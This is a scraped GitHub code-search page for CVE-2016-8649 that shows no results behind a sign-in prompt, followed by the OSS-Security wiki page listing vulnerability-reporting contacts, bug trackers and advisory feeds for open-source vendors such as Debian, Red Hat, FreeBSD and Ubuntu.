  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

"CVE-2016-8649"

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DCode%26q%3D%2522CVE-2016-8649%2522)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fsearch&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# code Search Results · "CVE-2016-8649"

## Filter by

* + [Code... (...)results](https://github.com/search?type=code&q=%22CVE-2016-8649%22)
  + [Repositoriesresults](https://github.com/search?type=repositories&q=%22CVE-2016-8649%22)
  + [Issuesresults](https://github.com/search?type=issues&q=%22CVE-2016-8649%22)
  + [Pull requestsresults](https://github.com/search?type=pullrequests&q=%22CVE-2016-8649%22)
  + [Discussionsresults](https://github.com/search?type=discussions&q=%22CVE-2016-8649%22)
  + [Usersresults](https://github.com/search?type=users&q=%22CVE-2016-8649%22)
  + More
* [Advanced search](https://github.com/search/advanced)
Code... (...)Filter![Mona looking through a globe hologram for code](/images/modules/search/light.png)Sign in to search code on GitHubBefore you can access our code search functionality please sign in or create a free account.[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DCode%26q%3D%2522CVE-2016-8649%2522)[Sign up](/signup?source=code_search_results)

You can’t perform that action at this time.



=== Content from oss-security.openwall.org_1298e9e4_20250126_010259.html ===

[[[vendors](/wiki/vendors?do=backlink "Backlinks")]]

[OSS-Security](/wiki/welcome "[H]")

Trace: • [vendors](/wiki/vendors "vendors")

### Table of Contents

* [Security-Related Vendor Information](#security-related-vendor-information)
  + [Amazon Linux AMI / Amazon Web Services](#amazon-linux-amiamazon-web-services)
  + [Apple Inc.](#apple-inc)
  + [Arch Linux](#arch-linux)
  + [Debian](#debian)
  + [DragonFly BSD](#dragonfly-bsd)
  + [Enea](#enea)
  + [FreeBSD](#freebsd)
  + [Frugalware Linux](#frugalware-linux)
  + [Gentoo Linux](#gentoo-linux)
  + [Homebrew](#homebrew)
  + [IBM](#ibm)
  + [Mageia](#mageia)
  + [Microsoft Linux Systems Group](#microsoft-linux-systems-group)
  + [MontaVista Software, LLC.](#montavista-software-llc)
  + [NetBSD](#netbsd)
  + [OpenBSD](#openbsd)
  + [OpenSUSE and SUSE](#opensuse-and-suse)
  + [Openwall](#openwall)
  + [Oracle Linux](#oracle-linux)
  + [Parallels Inc.](#parallels-inc)
  + [pkgsrc (NetBSD Packages Collection for multiple OS's incl. \*Bsd, Linux, Solaris, OSX, etc.)](#pkgsrc-netbsd-packages-collection-for-multiple-os-s-incl-bsd-linux-solaris-osx-etc)
  + [Qlustar](#qlustar)
  + [Red Hat Inc](#red-hat-inc)
  + [Solaris](#solaris)
  + [TurrisOS](#turrisos)
  + [Ubuntu](#ubuntu)
  + [VMware, Inc.](#vmware-inc)
  + [Wind River](#wind-river)
* [Other Resources](#other-resources)

# Security-Related Vendor Information

This page lists security contacts, bug tracker links, links to advisories, etc. for various open source-providing vendors, such as distributors of Linux, \*BSD, and other related operating systems.

When adding to this page, please include the following vendor information:

1. link to bug tracker (i.e. Bugzilla)
2. link to security advisories, errata, or any other page that provides notification of security-related updates/changes
3. email address for the security contact

As well, please keep this list in alphabetical order.

## Amazon Linux AMI / Amazon Web Services

* Security bulletins: [Amazon Linux AMI Security Center](https://aws.amazon.com/amazon-linux-ami/security-bulletins/ "https://aws.amazon.com/amazon-linux-ami/security-bulletins/") ([RSS feed](http://aws.amazon.com/rss/amazon-linux-ami.rss "http://aws.amazon.com/rss/amazon-linux-ami.rss"))
* Security contact: aws [dash] security [at] amazon [dot] com [PGP key](https://aws.amazon.com/security/aws-pgp-public-key/ "https://aws.amazon.com/security/aws-pgp-public-key/")
* [AWS Security Center](http://aws.amazon.com/security/ "http://aws.amazon.com/security/")
* [Vulnerability reporting information](http://aws.amazon.com/security/vulnerability-reporting/ "http://aws.amazon.com/security/vulnerability-reporting/")
## Apple Inc.

* [Security process information](http://www.apple.com/support/security/ "http://www.apple.com/support/security/")
* Security issues should be sent to product [dash] security [at] apple [dot] com
* Alternatively, reported through the [Apple Bug Reporter](https://developer.apple.com/bug-reporting/ "https://developer.apple.com/bug-reporting/")
* [Security advisories](https://support.apple.com/en-au/HT201222 "https://support.apple.com/en-au/HT201222")
## Arch Linux

* [Arch Linux bug tracker (public issues)](https://bugs.archlinux.org "https://bugs.archlinux.org")
* Security issues should be sent to security [at] archlinux [dot] org
## Debian

* [Debian bug tracker (public issues only)](http://bugs.debian.org "http://bugs.debian.org"), [Security issue tracker (public issues only)](http://security-tracker.debian.org "http://security-tracker.debian.org")
* Security issues should be sent to security [at] debian [dot] org
* Recent advisories are listed upon [our front page](http://security.debian.org/ "http://security.debian.org/")
## DragonFly BSD

* DragonFly Security Officer: security [at] dragonflybsd [dot] org ([PGP key](http://www.dragonflybsd.org/keys/ "http://www.dragonflybsd.org/keys/"))
## Enea

* [The process for receiving security advisories requires a Support or Maintenance subscription](http://lists.enea.com/mailman/listinfo/security-announce "http://lists.enea.com/mailman/listinfo/security-announce")
* [Bug tracking database - access requires a Support or Maintenance subscription](http://eneaissues.enea.com/ "http://eneaissues.enea.com/")
* Enea Security: [http://www.enea.com/solutions/Enea-Linux/Security](http://www.enea.com/solutions/Enea-Linux/Security "http://www.enea.com/solutions/Enea-Linux/Security")
* Enea security contacts can be reached at security [at] enea [dot] com
## FreeBSD

* [How and where to report a FreeBSD security issue](https://www.freebsd.org/security/reporting.html "https://www.freebsd.org/security/reporting.html")
  + All FreeBSD security issues should be reported to the FreeBSD Security Team at secteam [at] FreeBSD [dot] org
  + For a higher level of confidentiality, PGP-encrypted e-mail may be sent to the Security Officer Team at security [dash] officer [at] FreeBSD [dot] org ([PGP key](https://www.freebsd.org/security/so_public_key.asc "https://www.freebsd.org/security/so_public_key.asc"))
## Frugalware Linux

* Security issues should be sent to frugalware [dash] security [dash] private [at] frugalware [dot] org
* Advisories are published for the stable branch at the [Frugalware Security mailing list](http://frugalware.org/mailman/listinfo/frugalware-security/ "http://frugalware.org/mailman/listinfo/frugalware-security/")
## Gentoo Linux

* [Gentoo Bugzilla](https://bugs.gentoo.org/ "https://bugs.gentoo.org/") – see “Gentoo Security” product.
* Gentoo Linux Security Advisories (GLSA) published via [Mail](https://archives.gentoo.org/gentoo-announce/ "https://archives.gentoo.org/gentoo-announce/") ([subscribe](https://www.gentoo.org/get-involved/mailing-lists/ "https://www.gentoo.org/get-involved/mailing-lists/")), [HTTP](https://security.gentoo.org/glsa/ "https://security.gentoo.org/glsa/") and [Feeds](https://security.gentoo.org/subscribe "https://security.gentoo.org/subscribe").
* [Security Website](https://www.gentoo.org/support/security/ "https://www.gentoo.org/support/security/") with [Vulnerability Policy](https://www.gentoo.org/support/security/vulnerability-treatment-policy.html "https://www.gentoo.org/support/security/vulnerability-treatment-policy.html") and confidential contacts.
* Security contact: security [at] gentoo [dot] org, #gentoo-security on irc.freenode.net.
## Homebrew

* [Homebrew issue tracker](https://github.com/Homebrew/homebrew/issues "https://github.com/Homebrew/homebrew/issues")
* Security contact: security [at] brew [dot] sh
## IBM

* [How and where to report an IBM Product Security Incident](http://www-03.ibm.com/security/secure-engineering/report.html "http://www-03.ibm.com/security/secure-engineering/report.html")
* [Security Bulletins](http://www.ibm.com/connections/blogs/PSIRT "http://www.ibm.com/connections/blogs/PSIRT")
* [IBM Customer Support Portal](http://www-947.ibm.com/support/entry/portal/support "http://www-947.ibm.com/support/entry/portal/support")
* IBM Product Security Incident Support Team (PSIRT): psirt [at] us [dot] ibm [dot] com [PGP key](http://www-03.ibm.com/security/secure-engineering/IBM_PSIRT.asc "http://www-03.ibm.com/security/secure-engineering/IBM_PSIRT.asc")
## Mageia

* [Mageia Bugzilla](https://bugs.mageia.org "https://bugs.mageia.org")
* [Security and bugfix information)](http://advisories.mageia.org "http://advisories.mageia.org")
* Security contact: security [at] mageia [dot] org
## Microsoft Linux Systems Group

* Report security issues through the [Microsoft Security Response Center](https://www.microsoft.com/en-us/msrc "https://www.microsoft.com/en-us/msrc")
* Details on the reporting procedure are available  [here](https://portal.msrc.microsoft.com/en-us/engage/sbr "https://portal.msrc.microsoft.com/en-us/engage/sbr")
* Information about the bounty program [here](https://www.microsoft.com/en-us/msrc/bounty?rtc=1 "https://www.microsoft.com/en-us/msrc/bounty?rtc=1")
## MontaVista Software, LLC.

* The process for receiving security advisories requires a Support or Maintenance subscription.
* Bug tracking database - access requires a Support or Maintenance subscription.
* [Security Advisories](https://support.mvista.com/Security/CVE/ "https://support.mvista.com/Security/CVE/")
* MontaVista security contacts can be reached at security [at] mvista [dot] com [PGP key](https://support.mvista.com/Security/mv_psirt_pub_key.txt "https://support.mvista.com/Security/mv_psirt_pub_key.txt")
## NetBSD

* [Bug tracking database](http://www.netbsd.org/support/query-pr.html "http://www.netbsd.org/support/query-pr.html")
* [Contact and errata information](http://www.netbsd.org/support/security/ "http://www.netbsd.org/support/security/")
* Security contact: security [dash] alert [at] NetBSD [dot] org
* (for pkgsrc please see separate entry below)
## OpenBSD

* Bug tracking mailing list: bugs [at] openbsd [dot] org ([Archive](https://marc.info/?l=openbsd-bugs "https://marc.info/?l=openbsd-bugs"), [Subscribe](https://lists.openbsd.org/cgi-bin/mj_wwwusr?extra=bugs&func=lists-full-long "https://lists.openbsd.org/cgi-bin/mj_wwwusr?extra=bugs&func=lists-full-long"))
* [Security and errata information](https://www.openbsd.org/security.html "https://www.openbsd.org/security.html")
* Security contact: deraadt [at] openbsd [dot] org
## OpenSUSE and SUSE

* [Bugzilla](http://bugzilla.novell.com/ "http://bugzilla.novell.com/")
* [Security-support page](http://www.novell.com/linux/security/securitysupport.html "http://www.novell.com/linux/security/securitysupport.html")
* [SUSE Security Announcements RSS feed](http://www.novell.com/linux/security/suse_security.xml "http://www.novell.com/linux/security/suse_security.xml")
* [Mailing-list: opensuse-security-announce and opensuse-security](http://en.opensuse.org/Communicate/Mailinglists "http://en.opensuse.org/Communicate/Mailinglists")
* Security contact: security [at] suse [dot] de
## Openwall

* [Changes in the currently-maintained stable branch](http://www.openwall.com/Owl/CHANGES-stable.shtml "http://www.openwall.com/Owl/CHANGES-stable.shtml") (any security fixes are marked as such, along with issue severity information)
* [Changes in the development branch](http://www.openwall.com/Owl/CHANGES-current.shtml "http://www.openwall.com/Owl/CHANGES-current.shtml") (ditto)
* Security contact: security [at] owl [dot] openwall [dot] com
## Oracle Linux

* [Oracle Bugzilla](http://bugzilla.oracle.com/bugzilla/ "http://bugzilla.oracle.com/bugzilla/")
* [Oracle Linux Erratas](http://oss.oracle.com/pipermail/el-errata/ "http://oss.oracle.com/pipermail/el-errata/") includes security advisories
* [Security contact information](http://www.oracle.com/us/support/assurance/reporting/index.html "http://www.oracle.com/us/support/assurance/reporting/index.html") - email for reporting vulnerabilities: secalert\_us [at] oracle [dot] com
* [Oracle Linux](http://www.oracle.com/linux "http://www.oracle.com/linux") introduction, downloads, support offerings
* [Oracle security fix policy](http://www.oracle.com/us/support/assurance/fixing-policies/index.html "http://www.oracle.com/us/support/assurance/fixing-policies/index.html")
## Parallels Inc.

* Update announcements published via [Parallels KnowledgeBase](http://kb.sp.parallels.com "http://kb.sp.parallels.com") and [Parallels Cloud Server RSS](http://sp.parallels.com/products/pcs/rss "http://sp.parallels.com/products/pcs/rss"), [Parallels Containers for Linux RSS](http://sp.parallels.com/products/pvc/pcl-rss "http://sp.parallels.com/products/pvc/pcl-rss").
* Security contact: security [at] parallels [dot] com
## pkgsrc (NetBSD Packages Collection for multiple OS's incl. \*Bsd, Linux, Solaris, OSX, etc.)

* For issues in NetBSD please see the separate entry
* [Bug tracking database](http://www.netbsd.org/support/query-pr.html "http://www.netbsd.org/support/query-pr.html") – select 'pkg' Category
* [Vulnerable package versions database](http://ftp.netbsd.org/pub/NetBSD/packages/vulns/pkg-vulnerabilities "http://ftp.netbsd.org/pub/NetBSD/packages/vulns/pkg-vulnerabilities")
* Security contact: pkgsrc [dash] security [at] NetBSD [dot] org
* [PGP key](http://ftp.netbsd.org/pub/NetBSD/security/PGP/pkgsrc-security%40NetBSD.org.asc "http://ftp.netbsd.org/pub/NetBSD/security/PGP/pkgsrc-security@NetBSD.org.asc")
## Qlustar

* Qlustar Security Advisories (QSA) [Archive](https://qlustar.com/security-advisories "https://qlustar.com/security-advisories") ([subscribe](https://qlustar.com/newsletter/subscriptions "https://qlustar.com/newsletter/subscriptions")).
* Security contact: security [at] qlustar [dot] com
## Red Hat Inc

* Report security issues to secalert [at] redhat [dot] com or see [https://www.redhat.com/security/team/contact/](https://www.redhat.com/security/team/contact/ "https://www.redhat.com/security/team/contact/") for our keys and policies
* Advisories for all Red Hat products are published to [the RHSA announce mailing list](http://www.redhat.com/archives/rhsa-announce/ "http://www.redhat.com/archives/rhsa-announce/") since Nov 2007 (older are at [http://www.redhat.com/archives/enterprise-watch-list/](http://www.redhat.com/archives/enterprise-watch-list/ "http://www.redhat.com/archives/enterprise-watch-list/")).
## Solaris

* [Oracle Critical Patch Updates and Security Alerts](http://www.oracle.com/technetwork/topics/security/alerts-086861.html "http://www.oracle.com/technetwork/topics/security/alerts-086861.html")
* [Security contact information](http://www.oracle.com/us/support/assurance/reporting/index.html "http://www.oracle.com/us/support/assurance/reporting/index.html") - email for reporting vulnerabilities: secalert\_us [at] oracle [dot] com
* [Oracle security fix policy](http://www.oracle.com/us/support/assurance/fixing-policies/index.html "http://www.oracle.com/us/support/assurance/fixing-policies/index.html")
* [Changes in security policies for the Sun product lines](http://www.oracle.com/technetwork/topics/security/changesforsunsecuritypolicies-162219.html "http://www.oracle.com/technetwork/topics/security/changesforsunsecuritypolicies-162219.html")
## TurrisOS

* Use [https://gitlab.labs.nic.cz/turris/openwrt/issues](https://gitlab.labs.nic.cz/turris/openwrt/issues "https://gitlab.labs.nic.cz/turris/openwrt/issues") to report TurrisOS bugs (private security bugs can be opened by checking the “This issue is confidential and should only be visible to team members with at least Reporter access.” box).
* Security contacts for TurrisOS can be reached at security [at] turris [dot] cz.
## Ubuntu

* Use [Launchpad](https://launchpad.net/ubuntu/%2Bfilebug "https://launchpad.net/ubuntu/+filebug") to report Ubuntu bugs
  + Private security bugs can be opened by selecting the `“Private Security”` option in the `“This bug contains information that is:”` drop-down menu
* [Ubuntu Security Notices](https://usn.ubuntu.com/ "https://usn.ubuntu.com/") are sent to the [ubuntu-security-announce mailing list](https://lists.ubuntu.com/archives/ubuntu-security-announce/ "https://lists.ubuntu.com/archives/ubuntu-security-announce/")
* Security contacts for Ubuntu can be reached at security [at] ubuntu [dot] com or see the [Ubuntu Security FAQ](https://wiki.ubuntu.com/SecurityTeam/FAQ#Contact "https://wiki.ubuntu.com/SecurityTeam/FAQ#Contact") for more information
## VMware, Inc.

* VMware Security Advisories (VMSAs) are posted to [http://www.vmware.com/security/advisories](http://www.vmware.com/security/advisories "http://www.vmware.com/security/advisories").
* You can sign up for receiving security advisories at [http://www.vmware.com/security](http://www.vmware.com/security "http://www.vmware.com/security").
* Report security issues to security [at] vmware [dot] com or see the [VMware Security Response Policy](http://www.vmware.com/support/policies/security_response.html "http://www.vmware.com/support/policies/security_response.html") for more information.
## Wind River

* The process for receiving security advisories requires a Support or Maintenance subscription. [https://support.windriver.com/olsPortal/faces/basic/portal.jspx](https://support.windriver.com/olsPortal/faces/basic/portal.jspx "https://support.windriver.com/olsPortal/faces/basic/portal.jspx")
* [Info on what Wind River publicly disclose and what they don't; RSS feeds with the publicly disclosed info on security issues](http://www.openwall.com/lists/oss-security/2011/05/02/9 "http://www.openwall.com/lists/oss-security/2011/05/02/9")
* Wind River Linux security contacts can be reached at security [dash] alert [at] windriver [dot] com.
# Other Resources

There are separate wiki pages with similar information on [individual Open Source projects](/wiki/software "software") and the [infrastructure](/wiki/infrastructure "infrastructure").

There's a [similar page on the Distributions Wiki](http://distributions.freedesktop.org/wiki/DistributionLocations "http://distributions.freedesktop.org/wiki/DistributionLocations").

vendors.txt · Last modified: 2022/12/01 20:40 by akuster

Except where otherwise noted, content on this wiki is licensed under the following license: [CC Attribution-Noncommercial-Share Alike 3.0 Unported](https://creativecommons.org/licenses/by-nc-sa/3.0/)

[![Recent changes RSS feed](/wiki/lib/tpl/local/images/button-rss.png)](/wiki/feed.php "Recent changes RSS feed")
[![](/wiki/lib/images/license/button/cc-by-nc-sa.png)](https://creativecommons.org/licenses/by-nc-sa/3.0/ "CC Attribution-Noncommercial-Share Alike 3.0 Unported")
[![Donate to DokuWiki](/wiki/lib/tpl/local/images/button-donate.gif)](https://www.dokuwiki.org/donate "Donate to DokuWiki")
[![Powered by PHP](/wiki/lib/tpl/local/images/button-php.gif)](https://www.php.net "Powered by PHP")
[![Valid XHTML 1.0](/wiki/lib/tpl/local/images/button-xhtml.png)](https://validator.w3.org/check/referer "Valid XHTML 1.0")
[![Valid CSS](/wiki/lib/tpl/local/images/button-css.png)](https://jigsaw.w3.org/css-validator/check/referer?profile=css3 "Valid CSS")
[![Driven by DokuWiki](/wiki/lib/tpl/local/images/button-dw.png)](https://dokuwiki.org/ "Driven by DokuWiki")
[![Powered by OpenVZ](/wiki/lib/tpl/local/images/OpenVZ-80x15-cd.png)](https://openvz.org "Powered by OpenVZ - OS virtualization solution for Linux")
[![Powered by Openwall GNU/*/Linux](/wiki/lib/tpl/local/images/Owl-80x15-4.png)](https://www.openwall.com/Owl/ "Powered by Openwall GNU/*/Linux - security-enhanced \"Linux distribution\"")

![](/wiki/lib/exe/indexer.php?id=vendors&1737853375)

